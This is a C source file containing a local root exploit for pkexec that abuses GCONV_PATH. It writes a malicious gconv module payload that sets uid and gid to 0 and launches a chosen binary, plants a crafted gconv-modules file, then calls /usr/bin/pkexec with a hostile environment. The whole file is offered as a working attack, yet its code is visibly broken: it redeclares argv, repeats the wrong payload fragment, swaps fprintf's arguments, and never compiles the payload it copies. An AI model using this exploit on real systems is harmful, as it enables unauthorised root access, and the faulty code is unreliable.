#include <stdio.h>
#include <strings.h>
#include <stdlib.h>

#define BIN "/usr/bin/pkexec"
#define DIR "evildir"
#define EVILSO "evil"

char* exploitCode1 = "void gconv() {}\n"
"void gconv_init() {\n"
"    setuid(0);\n"
"    setgid(0);\n"
"    setgroups(0);\n"
"    execve(";
// Binary payload path goes here. E.g. "/bin/bash"
char* exploitCode2 = ", NULL, NULL);\n"
"}\n";

int main(int agrc, char * argv)
{
    char payload_string[1024];
    char* bin_payload = argv[1];

    strcpy(payload_string,exploitCode1);
    strcat(payload_string,bin_payload);
    strcat(payload_string,exploitCode1);
    
    FILE *exploit_fp;
    exploit_fp = fopen("payload.c", "w+");
    fprintf(payload_string,exploit_fp);
    fclose(exploit_fp);

    char *envp[] = {
        DIR,
        "PATH=GCONV_PATH=.",
        "SHELL=ryaagard",
        "CHARSET=ryaagard",
        NULL
    };
    char *argv[] = { NULL };

    system("mkdir GCONV_PATH=.");
    system("touch GCONV_PATH=./" DIR " && chmod 777 GCONV_PATH=./" DIR);
    system("mkdir " DIR);
    system("echo 'module\tINTERNAL\t\t\tryaagard//\t\t\t" EVILSO "\t\t\t2' > " DIR "/gconv-modules");
    system("cp " "payload.so " DIR);

    execve(BIN, argv, envp);

    return 0;
}
